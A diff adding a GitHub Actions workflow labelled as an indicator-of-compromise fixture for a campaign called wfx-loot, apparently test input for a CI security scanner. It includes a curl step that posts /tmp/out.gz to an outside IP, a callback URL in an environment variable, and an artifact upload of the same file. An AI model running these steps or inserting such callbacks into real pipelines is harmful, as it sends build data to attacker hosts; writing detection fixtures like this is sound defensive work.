@@ -1,0 +1,30 @@
+name: Known IOC fixture - wfx-loot (Nov 2026)
+# Each job plants one wfx-loot indicator in a different step field.
+on: push
+jobs:
+  callback-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Restore cache
+        env:
+          CB_URL: "http://194.150.166.244:8080/collect"
+        run: bash .ci-helper.sh
+  callback-run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s --data-binary @/tmp/out.gz http://18.143.168.96:8080/collect
+  summary-marker:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "<!--WFX-BEGIN-->" >> "$GITHUB_STEP_SUMMARY"
+  artifact-name:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: wfx-loot-${{ github.run_id }}
+          path: /tmp/out.gz
+  clean-job:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "wfx is not an indicator on its own"
